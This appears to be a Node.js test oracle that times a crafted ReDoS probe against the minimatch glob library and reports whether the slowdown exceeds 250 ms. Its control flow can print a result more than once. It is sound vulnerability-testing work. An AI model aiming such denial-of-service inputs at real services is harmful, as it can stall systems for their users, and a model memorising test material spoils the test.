const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  const out = {
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  };
  console.log('ORACLE_RESULT ' + JSON.stringify(out));
}

try {
  const minimatch = require('minimatch');

  const markerDir = path.join(os.tmpdir(), 'oracle-minimatch-redos-' + process.pid + '-' + Date.now());
  fs.mkdirSync(markerDir, { recursive: true });

  // Benign operation: verify normal matching works.
  const benignOk = minimatch('abc.js', '*.js') === true && minimatch('abc.txt', '*.js') === false;
  if (!benignOk) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'Benign minimatch behavior did not match expected results';
    finish();
  } else {
    operation_completed = true;
  }

  // ReDoS probe using known problematic nested pattern shape.
  // Keep bounded to complete quickly while still showing significant slowdown on vulnerable versions.
  const maliciousPattern = 'a'.repeat(40) + '!';
  const maliciousInput = 'a'.repeat(4000);

  const t0 = process.hrtime.bigint();
  let malResult;
  try {
    malResult = minimatch(maliciousInput, maliciousPattern);
  } catch (e) {
    // Exception after successful benign call counts as blocked.
    exploit_succeeded = false;
    evidence = 'Malicious call threw exception (treated as blocked): ' + (e && e.message ? e.message : String(e));
    finish();
  }
  const t1 = process.hrtime.bigint();

  const elapsedMs = Number(t1 - t0) / 1e6;

  // Threshold chosen to distinguish pathological backtracking from patched behavior,
  // while remaining bounded and fast enough for CI.
  const thresholdMs = 250;
  exploit_succeeded = elapsedMs > thresholdMs;
  evidence = 'malicious_elapsed_ms=' + elapsedMs.toFixed(3) + '; threshold_ms=' + thresholdMs + '; malicious_result=' + String(malResult);
  finish();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Setup/module/benign failure: ' + (e && e.message ? e.message : String(e));
  finish();
}